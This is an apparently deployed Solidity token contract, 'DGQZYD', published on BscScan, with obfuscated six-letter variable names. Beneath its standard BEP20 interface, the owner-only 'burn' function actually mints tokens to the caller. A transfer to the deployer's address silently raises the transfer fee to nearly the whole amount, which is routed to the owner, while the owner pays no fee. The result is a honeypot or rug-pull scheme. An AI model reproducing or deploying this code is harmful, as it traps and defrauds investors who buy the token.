/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.1;
contract DGQZYD {
string public  name = "DGQZYD";
uint256 private  JHSCPX = 1000000000000000000;
address private  CNEHCO = address(0);
uint256 private  DMXHKI = 10000000000;
uint256 private  VDQWQM = 1000000000000000;
uint8 public constant decimals = 18;
address public owner;
uint256 private  SLKNRA = 100000000;
address private  RJPIFX = address(0);
uint256 private  YELMOP = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OQUEFB = 1000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant PEXNEG = 99999;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "DGQZYD";
address private  FCOHNY = address(0);
address private  PUTWRM = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  GRCCPQ = address(0);
uint256 private  KOVFCO = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getPUTWRM() private returns (address) {
return PUTWRM;
}

function _getOQUEFB() private returns (uint256) {
return OQUEFB;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getSLKNRA() private returns (uint256) {
return SLKNRA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getDMXHKI() private returns (uint256) {
return DMXHKI;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getFCOHNY() private returns (address) {
return FCOHNY;
}

function _getKOVFCO() private returns (uint256) {
return KOVFCO;
}

function _getVDQWQM() private returns (uint256) {
return VDQWQM;
}

function _getCNEHCO() private returns (address) {
return CNEHCO;
}

function _getGRCCPQ() private returns (address) {
return GRCCPQ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BXVGUX");
require(to != address(0), "BXVGUX");
require(amount <= balanceOf[from], "BXVGUX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* PEXNEG/JHSCPX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==RJPIFX){
JHSCPX = PEXNEG+2;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getYELMOP() private returns (uint256) {
return YELMOP;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
RJPIFX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBXVGUX 0");
require(spender != address(0), "fBXVGUX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}